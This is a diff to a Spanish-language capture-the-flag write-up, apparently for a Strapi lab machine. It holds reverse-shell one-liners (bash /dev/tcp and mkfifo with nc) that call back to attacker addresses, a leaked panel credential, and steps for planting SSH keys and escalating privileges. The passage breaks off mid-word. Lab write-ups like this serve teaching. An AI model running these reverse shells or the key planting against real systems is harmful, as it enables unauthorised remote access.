@@ -158,7 +158,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.3/9001 0>&1
 ```
 Esta no funciona probemos con otra
 ```
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.214 4444 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 9001 >/tmp/f
 ```
 Con esta estamos dentro. 
 También darnos cuenta que nos han dado un token de autentificacion con el usuario y contraseña del panel de admin.
@@ -166,3 +166,35 @@ También darnos cuenta que nos han dado un token de autentificacion con el usuar
  admin:SuperStrongPassword1
 ```
 ## MOVIMIENTO LATERAL
+
+```
+script /dev/null -c bash
+ctrl-z
+stty raw -echo; fg
+Enter 
+```
+Esto lo hacemos para tener una shell interactiva
+
+Gracias a esto ya podemos sacar la primera flag la de usuario
+
+Posteriormente al hacer un poco de recolecta de información sabemos que nuestras claves ssh se encunetran en al ruta "/opt/strapi/.shh/authorized_keys" 
+
+Crearemos para empezar un .ssh para hacer un par de claves y posteriormente conectarnos por ssh
+
+```
+cd /opt/strapi
+mkdir .ssh
+ssh-keygen
+```
+Nos saldrán varias opciones para agregar texto pero simplemente en la primera opción elegimos strapi para que luego el output salga con ese nombre.
+
+Y copiamos el contenido del fichero "strapi.pub" y nos conectamos por ssh
+
+# ESCALACION DE PRIVILEGIOS
+
+Hacemos un netstat para ver los servicios que corren en los puertos
+```
+netstat -pentul
+```
+Si vamos haciendo curls a los diferentes puertos encontraremos diferente información interesante.
+Ahora si que vamos a utilizar bien el ssh, creamos desde nuestro ordenador principal unas keys como anteirormente y las llevamos a "autorized_ke
